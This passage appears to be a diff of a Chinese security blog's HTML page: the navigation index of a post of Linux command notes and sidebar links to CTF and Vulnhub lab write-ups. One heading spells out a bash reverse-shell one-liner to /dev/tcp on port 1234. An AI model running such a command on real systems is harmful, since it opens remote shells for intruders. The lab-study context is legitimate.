href="#smbclient-%E5%8F%82%E6%95%B0%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">smbclient 参数和使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-text">ftp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4%EF%BC%88%E7%99%BB%E5%BD%95%E5%90%8E%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-text">常用交互命令（登录后使用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getcap"><span class="nav-text">getcap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="nav-text">能力（Capabilities）示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ln"><span class="nav-text">ln</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-dev-tcp-ip-1234-0-1"><span class="nav-text">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-i"><span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp-192-168-240-83-1234"><span class="nav-text">&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1"><span class="nav-text">0&gt;&amp;1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stty-raw-echo-fg-%E7%BE%8E%E5%8C%96%E7%BB%88%E7%AB%AF"><span class="nav-text">stty raw -echo; fg (美化终端)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93"><span class="nav-text">–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pts"><span class="nav-text">pts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker"><span class="nav-text">docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wc"><span class="nav-text">wc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-7"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sulogin"><span class="nav-text">sulogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">cron定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lxd"><span class="nav-text">lxd</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -1075,20 +1196,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1111,6 +1232,12 @@
     </div>
     <ul class="links-of-recent-posts-list">
         <li class="links-of-recent-posts-item">
+          <a href="/posts/3905.html" title="posts&#x2F;3905.html">CTFSHOW第一部分web题wp整理</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/64270.html" title="posts&#x2F;64270.html">Vulnhub-Hackable:III</a>
+        </li>
+        <li class="links-of-recent-posts-item">
           <a href="/posts/34304.html" title="posts&#x2F;34304.html">Vulnhub-deathnote</a>
         </li>
         <li class="links-of-recent-posts-item">
@@ -1118,12 +1245,6 @@
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/posts/49152.html" title="posts&#x2F;49152.html">HMV-webmaster</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/58538.html" title="posts&#x2F;58538.html">Vulnhub-Gaokao</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/11143.html" title="posts&#x2F;11143.html">HMV-suidy</a>
         </li>
     </ul>
   </div>
